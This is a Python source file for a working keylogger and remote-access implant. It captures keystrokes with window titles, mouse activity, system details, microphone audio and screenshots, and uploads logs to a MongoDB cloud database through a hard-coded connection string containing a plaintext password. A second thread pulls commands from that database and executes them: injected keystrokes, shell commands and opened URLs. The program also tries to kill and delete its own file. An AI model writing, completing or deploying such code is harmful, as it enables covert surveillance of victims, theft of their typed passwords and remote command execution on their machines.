import os
import platform
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
import logging
import datetime
import pygetwindow
import pymongo
import subprocess
import webbrowser
import time
import pyautogui
from pymongo import DeleteMany
from pynput import keyboard
from pynput.keyboard import Listener
from pynput.mouse import Listener as MouseListener

SEND_REPORT_EVERY = 60  # as in seconds
LOG_FILE = 'keylogs.txt'  # File to store logs

# Get the directory of the main script
current_directory = os.path.dirname(os.path.abspath(__file__))


# Connect to MongoDB
client = pymongo.MongoClient("mongodb+srv://samratdey:mongoYzNqs%3DaQT1@keyspy.iarapa1.mongodb.net/")
db = client["keylogger"]
keylogs_collection = db["keylog"]
payload_collection = db["payload"]

class KeyLogger:
    def __init__(self, time_interval):
        self.interval = time_interval
        self.log = ""
        self.log_file = 'keylogs.txt'

        # Delete existing keylogs.txt file if present
        if os.path.exists(self.log_file):
            os.remove(self.log_file)

        logging.basicConfig(filename=self.log_file, level=logging.INFO, format="%(asctime)s> %(message)s")

    def append_log(self, log):
        with open(self.log_file, 'a') as file:  # Append mode to add new logs
            file.write(log + '\n')

    def save_log(self, log):
        with open(self.log_file, 'w') as file:  # Open file in write mode to overwrite
            file.write(log + '\n')

    def on_move(self, x, y):
        current_move = logging.info("Mouse moved to {} {}".format(x, y))
        self.append_log(current_move)

    def on_press(self, key):
        try:
            current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S,%f")
            window = pygetwindow.getWindowsWithTitle(pygetwindow.getActiveWindow().title)
            logging.info(f"{current_time}> {window[0].title}> '{key.char}'")
        except AttributeError:
            current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S,%f")
            logging.info(f"{current_time}> Unknown Window> {key}")

    def on_click(self, x, y, button, pressed):
        if pressed:
            current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S,%f")
            window = pygetwindow.getWindowsWithTitle(pygetwindow.getActiveWindow().title)
            logging.info(f"{current_time}> {window[0].title}> Mouse {button} clicked at ({x}, {y})")

    def on_scroll(self, x, y):
        current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
        self.append_log(current_scroll)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        self.append_log(current_key)

    def report(self):
        global logs
        self.store_in_mongodb()  # Store logs in MongoDB
        self.save_log(self.log)  # Save log to file
        self.log = ""  # Clear current log
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def store_in_mongodb(self):
        # Read the text file
        file_path = "keylogs.txt"
        with open(file_path, "r") as file:
            lines = file.readlines()

        # Insert each line as a separate document into the collection
        for line in lines:
            # Strip any leading/trailing whitespace and skip empty lines
            line = line.strip()
            if line:
                document = {"text": line}
                keylogs_collection.insert_one(document)

        print("Text content stored in MongoDB successfully.")

        # Clear the contents of the text file
        self.save_log("")

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.append_log(hostname)
        self.append_log(ip)
        self.append_log(plat)
        self.append_log(system)
        self.append_log(machine)

    def microphone(self):
        fs = 44100
        seconds = SEND_REPORT_EVERY
        obj = wave.open('sound.wav', 'w')
        obj.setnchannels(1)  # mono
        obj.setsampwidth(2)
        obj.setframerate(fs)
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        obj.writeframesraw(myrecording)
        sd.wait()

        # Send email with sound recording
        # Modify this part if you want to implement sound recording functionality

    def screenshot(self):
        img = pyscreenshot.grab()
        # Send email with screenshot
        # Modify this part if you want to implement screenshot functionality

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
            mouse_listener.join()

        if os.name == "nt":
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                print('File was closed.')
                os.system("DEL " + os.path.basename(__file__))
            except OSError:
                print('File is closed.')
        else:
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd " + pwd)
                os.system('pkill leafpad')
                os.system("chattr -i " + os.path.basename(__file__))
                print('File was closed.')
                os.system("rm -rf " + os.path.basename(__file__))
            except OSError:
                print('File is closed.')

def execute_command(command):
    try:
        if command.startswith("DELAY"):
            delay_time = int(command.split()[1]) / 1000.0
            time.sleep(delay_time)
        elif command.startswith("STRING"):
            string_to_type = command.split("STRING ")[1].strip()
            pyautogui.typewrite(string_to_type)
        elif command.startswith("ENTER"):
            pyautogui.press('enter')
        elif command.startswith("GUI"):
            gui_key = command.split()[1].lower()
            if gui_key == "r":
                pyautogui.hotkey('win', 'r')
            elif gui_key == "l":
                pyautogui.hotkey('win', 'l')
            else:
                print("Unsupported GUI key:", gui_key)
        elif command.startswith("MENU"):
            pyautogui.press('menu')
        elif command.startswith("CTRL"):
            ctrl_key = command.split()[1].lower()
            pyautogui.hotkey('ctrl', ctrl_key)
        elif command.startswith("ALT"):
            alt_key = command.split()[1].lower()
            pyautogui.hotkey('alt', alt_key)
        elif command.startswith("SHIFT"):
            shift_key = command.split()[1].lower()
            pyautogui.hotkey('shift', shift_key)
        elif command.startswith("REM") or command.startswith("//"):
            # Ignore comments
            pass
        elif command.startswith("EXECUTE:"):
            file_path = command.split(":")[1].strip()
            subprocess.Popen(file_path, shell=True)
        elif command.startswith("BROWSE:"):
            url = command.split(":")[1].strip()
            webbrowser.open(url)
        elif command.startswith("CUSTOM:"):
            custom_command = command.split(":")[1].strip()
            # Add more custom command handling here as needed
        else:
            # Invalid command
            print("Invalid command:", command)
    except Exception as e:
        print("Error executing command:", e)

def store_and_execute_payload():
    while True:
        try:
            # Retrieve the document from MongoDB
            document = payload_collection.find_one()

            if document:
                # Check if the document contains the expected key
                if "text" in document:
                    # Get the text content from the document
                    text_content = document["text"]

                    # Delete existing "payload.txt" file if present
                    if os.path.exists("payload.txt"):
                        os.remove("payload.txt")

                    # Save the text content to "payload.txt" file
                    with open("payload.txt", "w") as file:
                        file.write(text_content)

                    print("Text content retrieved from MongoDB and stored in payload.txt.")
                    # Execute the payload immediately
                    execute_payload()

                    # Delete the document from the collection
                    payload_collection.delete_one({"_id": document["_id"]})
                    print("Payload document deleted from MongoDB.")

                else:
                    print("Document does not contain the '\"text\"' key.")
            else:
                print("No document found in MongoDB.")
            
            # Wait for 30 seconds before checking for new payloads again
            time.sleep(30)
        
        except KeyboardInterrupt:
            print("Keyboard interrupt detected. Continuing execution...")

def execute_payload():
    try:
        # current_directory = os.path.abspath(os.path.dirname(__file__))
        file_path = os.path.join(current_directory, 'payload.txt')
        if os.path.isfile(file_path) and os.path.getsize(file_path) > 0:
            print("Executing payload...")
            with open(file_path, 'r') as file:
                for line in file:
                    execute_command(line.strip())
            # Delete the payload.txt file after executing the payload
            os.remove(file_path)
            print("Payload executed successfully.")
        else:
            print("Payload file is empty or does not exist.")
    except Exception as e:
        print("Error executing payload:", e)



def run_keylogger():
    keylogger = KeyLogger(SEND_REPORT_EVERY)
    keylogger.run()

def execute_payload_script():
    store_and_execute_payload()

if __name__ == '__main__':
    t1 = threading.Thread(target=run_keylogger)
    t2 = threading.Thread(target=execute_payload_script)

    t1.start()
    t2.start()
